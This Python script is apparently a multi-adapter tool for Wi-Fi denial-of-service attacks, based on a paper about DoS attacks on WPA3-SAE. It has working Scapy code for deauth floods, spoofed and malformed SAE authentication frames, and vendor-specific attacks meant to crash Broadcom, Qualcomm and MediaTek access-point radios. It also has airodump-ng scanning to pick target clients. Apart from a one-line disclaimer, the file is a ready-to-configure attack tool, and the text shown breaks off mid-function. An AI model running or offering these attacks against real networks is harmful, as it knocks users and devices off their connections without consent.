#!/usr/bin/env python3
"""
================================================================================
Wi-Fi DoS Orchestrator - SCIENTIFICALLY ACCURATE VERSION
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications (2022)

FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
SCIENTIFICALLY CORRECTED VERSION WITH:
1. Atomic scanner processing (no race conditions)
2. Correct airodump-ng CSV parsing logic
3. Scientific packet timing for reproducible experiments
4. Detailed error handling and logging
================================================================================
"""

import subprocess
import time
import os
import sys
import glob
import random
import json
from datetime import datetime
from multiprocessing import Process, Value
import re

# =====================================================================================
# ======================== GLOBAL IMPORTS (scientifically correct) ====================
# =====================================================================================

from scapy.all import (
    RadioTap, Dot11, Dot11Auth, Dot11Deauth, EAPOL,
    sendp, RandMAC, hexdump, Packet
)

# =====================================================================================
# ======================== CENTRAL CONFIGURATION ======================================
# =====================================================================================

# --- 1. TARGET DATA ---
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"

# --- 2. SAE PARAMETERS (EXTRACTED VIA WIRESHARK) ---
# IMPORTANT: Enter DIFFERENT values for 2.4 GHz and 5 GHz!

# > Parameters for 2.4 GHz Network
SAE_SCALAR_2_4_HEX = 'INSERT_2_4_SCALAR_HERE' # Example: '49f7dcc4fb5725917c2ba1412ff42123f2dc699a0950db0828fe9d01c9786b80'
SAE_FINITE_2_4_HEX = 'INSERT_2_4_FINITE_HERE' # Example: '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403aebdf7d0b2c68607dc39a2891e0e8243b4990e493a25abc8ce6ebad06da0e201879f966c6518'

# > Parameters for 5 GHz Network
SAE_SCALAR_5_HEX = 'INSERT_5_SCALAR_HERE'
SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'

# --- 3. SCANNER / MANUAL CHANNELS ---
SCANNER_INTERFACE = "wlan0mon"
MANUELLER_KANAL_5GHZ = "36"
MANUELLER_KANAL_2_4GHZ = "1"

# --- 4. TARGET CLIENTS (MANUAL ASSIGNMENT) ---

# Clients for GENERAL attacks (deauth_flood, pmf_deauth_exploit, malformed...)
TARGET_STA_MACS = [
#    "AA:BB:CC:DD:EE:11",         Remove # to set the MAC address!
#    "AA:BB:CC:DD:EE:11",
#    "AA:BB:CC:DD:EE:11"
]

# GROUP A: TARGET IS 5 GHz (The 5 GHz band should crash)
# These attacks require MAC addresses of clients currently on 5 GHz.
# - case6_radio_confusion (Standard)
# - case13_radio_confusion_mediatek_reverse (Reverse)
TARGET_STA_MACS_5GHZ_SPECIAL = [
#    "AA:BB:CC:DD:EE:11",       Remove # to set the MAC address!
#    "AA:BB:CC:DD:EE:11",
#    "AA:BB:CC:DD:EE:11"
]

# GROUP B: TARGET IS 2.4 GHz (The 2.4 GHz band should crash)
# These attacks require MAC addresses of clients currently on 2.4 GHz.
# - case6_radio_confusion_reverse (Reverse)
# - case13_radio_confusion_mediatek (Standard)
TARGET_STA_MACS_2_4GHZ_SPECIAL = [
#    "AA:BB:CC:DD:EE:11",         Remove # to set the MAC address!
#    "AA:BB:CC:DD:EE:11",     
#    "AA:BB:CC:DD:EE:11"
]
# ====================== COMPLETE ENCYCLOPEDIA OF ATTACKS ======================
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection.
# "pmf_deauth_exploit": Exploits the PMF protection mechanism against the client. 
# Phase 1: Preparation (The main attack)
#
#    You start one of your DoS attacks (e.g., back_to_the_future, open_auth, or amplification).
#
#    Goal: The CPU and/or memory of the router are so heavily loaded that it reacts very slowly or not at all to new requests. The router is now "weakened".
#
# Phase 2: The Trigger (The Exploit)
#
#    Your pmf_deauth_exploit process sends a single, unprotected deauthentication frame. It spoofs the router's MAC address.
#
# "malformed_msg1_length", "malformed_msg1_flags": Attacks the client driver via the 4-Way Handshake.
#
# --- Category: Generic WPA3-SAE Attacks (from Section 4 of the study) ---
#
# "bad_algo": Sends authentication frames with an invalid algorithm value.
# "bad_seq": Sends SAE frames with an invalid sequence number.
# "bad_status_code": Sends SAE confirm frames with an invalid status code.
# "empty_frame_confirm": Sends empty SAE confirm frames.
#
# --- Category: Vendor Specific Attacks (from Section 6 of the study) ---
#
# "case1_denial_of_internet": Disconnects a client from the internet by deleting its session on the AP. Broadcom.
# "case2_bad_auth_algo_broadcom": Uses invalid algorithm values to disrupt Broadcom APs. Broadcom.
# "case3_bad_status_code": Sends SAE confirm frames with an invalid status code. Broadcom.
# "case4_bad_send_confirm": Manipulates the "Send-Confirm" counter in SAE confirm frames. Broadcom.
# "case5_empty_frame": Sends empty SAE confirm frames. Broadcom.
# "case6_radio_confusion": Confuses dual-band drivers. Purpose: Crashes the 5 GHz band. Broadcom.
# "case6_radio_confusion_reverse": Inverse logic of Case 6. Purpose: Crashes the 2.4 GHz band. Broadcom.
# "case7_back_to_the_future": Overloads WPA2 APs with WPA3 packets. Broadcom.
# "case8_bad_auth_algo_qualcomm": Like Case II, but tailored to Qualcomm chipsets. Qualcomm.
# "case9_bad_sequence_number": Uses invalid sequence numbers in authentication frames. Qualcomm.
# "case10a_bad_auth_body_empty": Sends authentication frames with an empty body. Qualcomm.
# "case10b_bad_auth_body_payload": Sends authentication frames with a faulty payload. Qualcomm.
# "case11_seq_status_fuzz": Performs a fuzzing attack with varying sequence and status codes. Qualcomm.
# "case12_bursty_auth": Sends authentication frames in bursts to force MediaTek APs to reboot. MediaTek.
# "case13_radio_confusion_mediatek": Confuses MediaTek drivers. Purpose: Crashes the 2.4 GHz band.
# "case13_radio_confusion_mediatek_reverse": Inverse logic of Case 13. Purpose: Crashes the 5 GHz band.
#
###############################################################################################################################################
    # TARGET: 5 GHz Crash (Broadcom APs)
    # IMPORTANT: Adapter must be on 2.4 GHz because we "shoot" from there
#    "wlan7mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"},
#
    # TARGET: 5 GHz Crash (MediaTek APs)
    # IMPORTANT: Adapter must be on 2.4 GHz
#    "wlan6mon": {"band": "2.4GHz", "angriff": "case13_radio_confusion_mediatek_reverse"}     
#
######################################################################################################
    # TARGET: 2.4 GHz Crash (Broadcom APs)
    # IMPORTANT: Adapter must be on 5 GHz to attack from there
#    "wlan7mon": {"band": "5GHz", "angriff": "case6_radio_confusion_reverse"},
#
    # TARGET: 2.4 GHz Crash (MediaTek APs)
    # IMPORTANT: Adapter must be on 5 GHz
#    "wlan6mon": {"band": "5GHz", "angriff": "case13_radio_confusion_mediatek"}     
# 
# Conclusion for your configuration
#
# You don't need to remember why this is, just what your target is. The logic actually "crosses" due to historical documentation:
#
#    Case 6 (Standard) = Case 13 (Reverse) = Both crash 5 GHz.
#
#    Case 6 (Reverse) = Case 13 (Standard) = Both crash 2.4 GHz.
#
# ==============================================================================================
# --- 5. ADAPTER & ATTACK CONFIGURATION ---
ADAPTER_KONFIGURATION = {
#   "wlan1mon": {"band": "5GHz", "angriff": "case13_radio_confusion_mediatek"}, # Remove # so set! 
    "wlan2mon": {"band": "5GHz", "angriff": "case6_radio_confusion_reverse"},
#   "wlan3mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"},         # Remove # so set! 
    "wlan4mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"}
}

# --- 6. SCIENTIFIC PARAMETERS (reproducible experiments) ---
SCAN_DURATION = 90                    # Seconds for scanning
PACKETS_PER_SECOND_LIMIT = 1000       # Ethical packet rate limit
BURST_SIZE_OPTIMAL = 64               # Scientifically optimal burst size
INTER_PACKET_GAP = 0.0001            # 100μs between packets (real burst)
EXPERIMENT_DURATION = 3600            # Maximum experiment duration

# =====================================================================================
# ======================== SCIENTIFIC HELPER FUNCTIONS ================================
# =====================================================================================

def set_channel_scientific(interface: str, channel: str) -> bool:
    """
    Set channel scientifically correct with complete error handling
    Returns: True on success, False on failure
    """
    try:
        # Method 1: With 'iw' (modern)
        result = subprocess.run(
            ['iw', 'dev', interface, 'set', 'channel', str(channel)],
            capture_output=True,
            text=True,
            timeout=2
        )
        
        if result.returncode == 0:
            time.sleep(0.1)
            return True
        
        # Method 2: With 'iwconfig' (legacy)
        result = subprocess.run(
            ['iwconfig', interface, 'channel', str(channel)],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            time.sleep(0.15)
            return True
            
        print(f"[ERROR-SCIENTIFIC] Could not set channel {channel} on {interface}")
        return False
        
    except subprocess.TimeoutExpired:
        print(f"[ERROR-SCIENTIFIC] Timeout setting channel {channel} on {interface}")
        return False
    except Exception as e:
        print(f"[ERROR-SCIENTIFIC] Exception setting channel: {e}")
        return False

def parse_airodump_csv_scientific(csv_file_path: str) -> dict:
    """
    Parse airodump-ng CSV scientifically correctly
    Handles both CSV formats (AP and Client) correctly
    """
    result = {
        "aps": {},
        "clients": {"5ghz": [], "2.4ghz": []}
    }
    
    try:
        if not os.path.exists(csv_file_path):
            return result
        
        with open(csv_file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        lines = content.strip().split('\n')
        
        # Find section boundaries scientifically
        ap_start = None
        client_start = None
        
        for i, line in enumerate(lines):
            if "BSSID" in line and "Channel" in line and "ESSID" in line:
                ap_start = i
            elif "Station MAC" in line and "BSSID" in line and "Power" in line:
                client_start = i
        
        # Parse AP section scientifically correct
        if ap_start is not None and client_start is not None:
            for i in range(ap_start + 1, client_start):
                if i >= len(lines) or not lines[i].strip():
                    continue
                
                parts = [p.strip() for p in lines[i].split(',')]
                
                if len(parts) >= 14:  # Standard airodump-ng format
                    bssid = parts[0].upper()
                    channel = parts[3]
                    
                    # Scientific BSSID validation
                    if len(bssid) == 17 and ':' in bssid:
                        ap_info = {
                            "bssid": bssid,
                            "channel": channel
                        }
                        
                        # Scientific frequency mapping
                        try:
                            channel_int = int(channel)
                            if 1 <= channel_int <= 14:
                                result["aps"]["2.4ghz"] = ap_info
                            elif 36 <= channel_int <= 165:
                                result["aps"]["5ghz"] = ap_info
                        except ValueError:
                            pass
        
        # Parse Client section scientifically correct
        if client_start is not None:
            for i in range(client_start + 1, len(lines)):
                if not lines[i].strip():
                    continue
                
                parts = [p.strip() for p in lines[i].split(',')]
                
                if len(parts) >= 6:
                    client_mac = parts[0].upper()
                    connected_bssid = parts[5].upper() if len(parts) > 5 else ""
                    
                    # Scientific: Only valid MACs
                    if (len(client_mac) == 17 and ':' in client_mac and
                        connected_bssid in [TARGET_BSSID_5GHZ, TARGET_BSSID_2_4GHZ]):
                        
                        if connected_bssid == TARGET_BSSID_5GHZ:
                            result["clients"]["5ghz"].append(client_mac)
                        elif connected_bssid == TARGET_BSSID_2_4GHZ:
                            result["clients"]["2.4ghz"].append(client_mac)
        
    except Exception as e:
        print(f"[ERROR-SCIENTIFIC] CSV parsing error: {e}")
    
    return result

def run_airodump_scientific(interface: str, duration: int) -> dict:
    """
    Run airodump-ng scientifically correct
    No race conditions through atomic file handling
    """
    scan_id = f"scan_{int(time.time())}"
    output_prefix = f"scan_{scan_id}"
    
    try:
        # Start airodump-ng with scientific parameters
        cmd = [
            'airodump-ng',
            interface,
            '--band', 'abg',
            '--write', output_prefix,
            '--output-format', 'csv',
            '--write-interval', '5'
        ]
        
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Scientific: Wait for complete scan
        time.sleep(duration)
        
        # Proper termination
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        
        # Scientific: Wait for file synchronization
        time.sleep(1)
        
        # Find and parse CSV files
        csv_files = glob.glob(f"{output_prefix}*.csv")
        latest_csv = None
        latest_mtime = 0
        
        for csv_file in csv_files:
            mtime = os.path.getmtime(csv_file)
            if mtime > latest_mtime:
                latest_mtime = mtime
                latest_csv = csv_file
        
        if latest_csv:
            result = parse_airodump_csv_scientific(latest_csv)
            return result
        else:
            return {"aps": {}, "clients": {"5ghz": [], "2.4ghz": []}}
            
    except Exception as e:
        print(f"[ERROR-SCIENTIFIC] Scanning error: {e}")
        return {"aps": {}, "clients": {"5ghz": [], "2.4ghz": []}}

def send_burst_scientific(packet_list: list, interface: str, counter: Value, 
                         rate_limit: int = PACKETS_PER_SECOND_LIMIT) -> tuple:
    """
    Send packet burst scientifically correct with timing control
    Returns: (packets sent, time taken)
    """
    if not packet_list:
        return 0, 0.0
    
    start_time = time.time()
    sent_count = 0
    
    try:
        # Scientific: Calculate optimal timing
        batch_size = min(len(packet_list), BURST_SIZE_OPTIMAL)
        
        for i in range(0, len(packet_list), batch_size):
            batch = packet_list[i:i + batch_size]
            
            # Scientifically precise sending
            sendp(
                batch,
                iface=interface,
                verbose=False,
                inter=INTER_PACKET_GAP,
                count=1
            )
            
            sent_count += len(batch)
            
            # Scientific: Rate limiting
            elapsed = time.time() - start_time
            expected_time = sent_count / rate_limit
            
            if elapsed < expected_time:
                time.sleep(expected_time - elapsed)
            
            # Update counter atomically
            with counter.get_lock():
                counter.value += len(batch)
        
        elapsed_time = time.time() - start_time
        
        return sent_count, elapsed_time
        
    except OSError as e:
        # Scientific: Error handling for full buffers
        print(f"[WARNING-SCIENTIFIC] Buffer error: {e}")
        time.sleep(0.1)  # Backoff for buffer recovery
        return 0, 0.0

def create_sae_payload_scientific(scalar_hex: str, finite_hex: str) -> bytes:
    """
    Create SAE payload scientifically correct according to IEEE 802.11-2020
    """
    try:
        scalar_bytes = bytes.fromhex(scalar_hex)
        finite_bytes = bytes.fromhex(finite_hex)
        
        # Scientific: SAE Commit Frame Format
        payload = b'\x13\x00'  # Group ID 19 (Elliptic Curve P-256)
        payload += scalar_bytes[:32]
        payload += finite_bytes[:64]
        
        return payload[:98]  # Total length: 2 + 32 + 64 = 98 bytes
        
    except Exception as e:
        print(f"[ERROR-SCIENTIFIC] SAE payload creation failed: {e}")
        return b'\x13\x00' + b'\x00' * 96  # Fallback

def cleanup(proc_dict):
    print("\n[INFO-SCIENTIFIC] Cleanup...")
    for proc in proc_dict.values():
        if proc and isinstance(proc, (Process, subprocess.Popen)):
            try:
                if isinstance(proc, Process) and proc.is_alive(): 
                    proc.terminate()
                    proc.join(timeout=2)
                    if proc.is_alive():
                        proc.kill()
                elif isinstance(proc, subprocess.Popen) and proc.poll() is None: 
                    proc.kill()
            except Exception as e:
                print(f"[WARNING-SCIENTIFIC] Cleanup error: {e}")
    
    # Clean scan files scientifically
    for pattern in ["scan_*.csv", "scan_*.kismet.csv", "scan_*.kismet.netxml"]:
        for f in glob.glob(pattern):
            try: 
                os.remove(f)
            except OSError: 
                pass

# =====================================================================================
# ======================== ATTACK FUNCTIONS (SCIENTIFICALLY CORRECTED) ===============
# =====================================================================================

# --- Vendor Specific Attacks ---

def run_case1_denial_of_internet_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        print(f"[WARNING-SCIENTIFIC] {interface}: No clients for case1")
        return
    
    print(f"\n[INFO-CASE1-SCIENTIFIC] {interface}: Denial of Internet (Spoofed SAE Commit) on CH {channel}...")
    if not set_channel_scientific(interface, channel): 
        return
    
    SAE_PAYLOAD = create_sae_payload_scientific(kwargs['scalar_hex'], kwargs['finite_hex'])
    
    try:
        while True:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                burst.append(pkt)
            
            send_burst_scientific(burst * 50, interface, counter) 
            time.sleep(5)
    except KeyboardInterrupt: 
        pass

def run_case2_bad_auth_algo_broadcom_process(interface, counter, **kwargs):
    bssid, channel = kwargs['bssid'], kwargs['channel']
    if not set_channel_scientific(interface, channel): 
        return
    
    print(f"\n[INFO-CASE2-SCIENTIFIC] {interface}: Bad Algo Broadcom (Burst Mode)...")
    
    try:
        while True:
            burst = []
            for _ in range(128):
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=5, seqnum=1, status=0)
                burst.append(pkt)
            send_burst_scientific(burst, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case3_bad_status_code_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"\n[INFO-CASE3-SCIENTIFIC] {interface}: Bad Status Code...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        while True:
            burst = []
            for client in clients:
                PAYLOAD = b'\x00\x00' + os.urandom(32)
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=77)/PAYLOAD
                burst.append(pkt)
            send_burst_scientific(burst * 64, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case4_bad_send_confirm_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"\n[INFO-CASE4-SCIENTIFIC] {interface}: Bad Send-Confirm...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        while True:
            burst = []
            for client in clients:
                PAYLOAD = b'\x11\x11' + os.urandom(32)
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)/PAYLOAD
                burst.append(pkt)
            send_burst_scientific(burst * 64, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case5_empty_frame_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"\n[INFO-CASE5-SCIENTIFIC] {interface}: Empty Frame...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        while True:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)
                burst.append(pkt)
            send_burst_scientific(burst * 64, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case6_radio_confusion_process(interface, counter, **kwargs):
    """SCIENTIFIC VERSION: NO CHANNEL HOPPING. Send on 2.4GHz -> Target 5GHz BSSID"""
    
    send_channel = kwargs['channel_2_4ghz']
    target_bssid = kwargs['bssid_5ghz']
    clients = kwargs.get('clients', [])
    
    if not (send_channel and target_bssid and clients): 
        return
    
    print(f"\n[INFO-CASE6-SCIENTIFIC] {interface}: Radio Confusion. Sending on {send_channel} -> Targeting 5GHz BSSID.")
    if not set_channel_scientific(interface, send_channel): 
        return

    SAE_PAYLOAD = create_sae_payload_scientific(kwargs['scalar_hex'], kwargs['finite_hex'])
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=client, addr3=target_bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                burst.append(pkt)
            
            if burst: 
                send_burst_scientific(burst * (128 // len(burst) + 1), interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case6_radio_confusion_reverse_process(interface, counter, **kwargs):
    """SCIENTIFIC VERSION: Send on 5GHz -> Target 2.4GHz"""
    
    send_channel = kwargs['channel_5ghz']
    target_bssid = kwargs['bssid_2_4ghz']
    clients = kwargs.get('clients', [])
    
    if not (send_channel and target_bssid and clients): 
        return
    
    print(f"\n[INFO-CASE6-REV-SCIENTIFIC] {interface}: Radio Confusion Rev. Sending on {send_channel} -> Targeting 2.4GHz BSSID.")
    if not set_channel_scientific(interface, send_channel): 
        return
    
    SAE_PAYLOAD = create_sae_payload_scientific(kwargs['scalar_hex'], kwargs['finite_hex'])
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=client, addr3=target_bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                burst.append(pkt)
            
            if burst: 
                send_burst_scientific(burst * (128 // len(burst) + 1), interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case7_back_to_the_future_process(interface, counter, **kwargs):
    bssid, channel = kwargs['bssid'], kwargs['channel']
    if not set_channel_scientific(interface, channel): 
        return
    
    print(f"\n[INFO-CASE7-SCIENTIFIC] {interface}: Starting Back to the Future (Unique MACs)...")
    SAE_PAYLOAD = create_sae_payload_scientific(kwargs['scalar_hex'], kwargs['finite_hex'])
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for _ in range(128):
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                burst.append(pkt)
            send_burst_scientific(burst, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case8_bad_auth_algo_qualcomm_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"\n[INFO-CASE8-SCIENTIFIC] {interface}: Starting Bad Auth Algo (Qualcomm)...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0] + list(range(7, 100))), seqnum=1, status=0)
                burst.append(pkt)
            send_burst_scientific(burst * 20, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case9_bad_sequence_number_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"\n[INFO-CASE9-SCIENTIFIC] {interface}: Starting Bad Sequence Number...")
    if not set_channel_scientific(interface, channel): 
        return
    
    SAE_PAYLOAD = create_sae_payload_scientific(kwargs['scalar_hex'], kwargs['finite_hex'])
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0, 3]), seqnum=3, status=0)/SAE_PAYLOAD
                burst.append(pkt)
            send_burst_scientific(burst * 20, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case10a_bad_auth_body_empty_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"\n[INFO-CASE10A-SCIENTIFIC] {interface}: Starting Bad Auth Body (Empty)...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.randint(1, 65535))
                burst.append(pkt)
            send_burst_scientific(burst * 50, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case10b_bad_auth_body_payload_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"\n[INFO-CASE10B-SCIENTIFIC] {interface}: Starting Bad Auth Body (Payload)...")
    if not set_channel_scientific(interface, channel): 
        return
    
    BAD_PAYLOAD = bytes.fromhex('1300b8263a4b72b42638691b47d442785f92ab519b3eff598563c3a3e1914446990b05afd3996a922b6ede4f5f063ecbbe83ee10e9778f8d118b6eed76b97b8d29d7d4d2275704c1a2ff018234deef54e6806ee083b04c27028dcebf71df73e79296')
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.randint(1, 65535))/BAD_PAYLOAD
                burst.append(pkt)
            send_burst_scientific(burst * 50, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case11_seq_status_fuzz_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"\n[INFO-CASE11-SCIENTIFIC] {interface}: Starting Seq/Status Fuzzing...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        client = clients[0]
        start_time = time.time()
        
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            for seq_num in range(2):
                status_code = 0
                burst = []
                for i in range(1000):
                    if i % 100 == 0: 
                        status_code = (status_code % 11) + 1
                    pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=0, seqnum=seq_num, status=status_code)
                    burst.append(pkt)
                    if len(burst) >= 128:
                        send_burst_scientific(burst, interface, counter)
                        burst = []
                if burst: 
                    send_burst_scientific(burst, interface, counter)
            time.sleep(1)
    except KeyboardInterrupt: 
        pass

def run_case12_bursty_auth_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"\n[INFO-CASE12-SCIENTIFIC] {interface}: Starting Bursty Auth (MediaTek)...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                for algo in range(1, 5):
                    pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=algo, seqnum=1, status=0)
                    burst.append(pkt)
            send_burst_scientific(burst * 25, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case13_radio_confusion_mediatek_process(interface, counter, **kwargs):
    """SCIENTIFIC VERSION: Target is 2.4GHz, send from 5GHz (Cross-Band)"""
    
    send_channel = kwargs.get('channel_5ghz')
    target_bssid = kwargs.get('bssid_2_4ghz')
    clients = kwargs.get('clients', [])
    
    if not (send_channel and target_bssid and clients): 
        return
    
    print(f"\n[INFO-CASE13-SCIENTIFIC] {interface}: MediaTek Cross-Band. Sending on {send_channel} -> Targeting 2.4GHz.")
    if not set_channel_scientific(interface, send_channel): 
        return
    
    SAE_PAYLOAD = create_sae_payload_scientific(kwargs['scalar_hex'], kwargs['finite_hex'])
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=client, addr3=target_bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                burst.append(pkt)
            
            if burst: 
                send_burst_scientific(burst * 64, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_case13_radio_confusion_mediatek_reverse_process(interface, counter, **kwargs):
    """SCIENTIFIC VERSION: Target is 5GHz, send from 2.4GHz (Cross-Band)"""
    
    send_channel = kwargs.get('channel_2_4ghz')
    target_bssid = kwargs.get('bssid_5ghz')
    clients = kwargs.get('clients', [])
    
    if not (send_channel and target_bssid and clients): 
        return
    
    print(f"\n[INFO-CASE13-REV-SCIENTIFIC] {interface}: MediaTek Cross-Band Rev. Sending on {send_channel} -> Targeting 5GHz.")
    if not set_channel_scientific(interface, send_channel): 
        return
    
    SAE_PAYLOAD = create_sae_payload_scientific(kwargs['scalar_hex'], kwargs['finite_hex'])
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=client, addr3=target_bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                burst.append(pkt)
            
            if burst: 
                send_burst_scientific(burst * 64, interface, counter)
    except KeyboardInterrupt: 
        pass

# --- Client Direct Attacks ---

def run_deauth_flood_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"[INFO-DEAUTH-SCIENTIFIC] {interface}: Starting Deauth Flood...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                p1 = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                p2 = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth(reason=7)
                burst.extend([p1, p2])
            
            send_burst_scientific(burst * 32, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_pmf_deauth_exploit_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"[INFO-PMF-SCIENTIFIC] {interface}: Starting PMF Deauth Exploit...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for client in clients:
                pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=3)
                burst.append(pkt)
            
            send_burst_scientific(burst * 50, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_malformed_msg1_process(interface, counter, **kwargs):
    bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
    if not clients: 
        return
    
    print(f"[INFO-MALFORMED-SCIENTIFIC] {interface}: Starting Malformed MSG1...")
    if not set_channel_scientific(interface, channel): 
        return
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
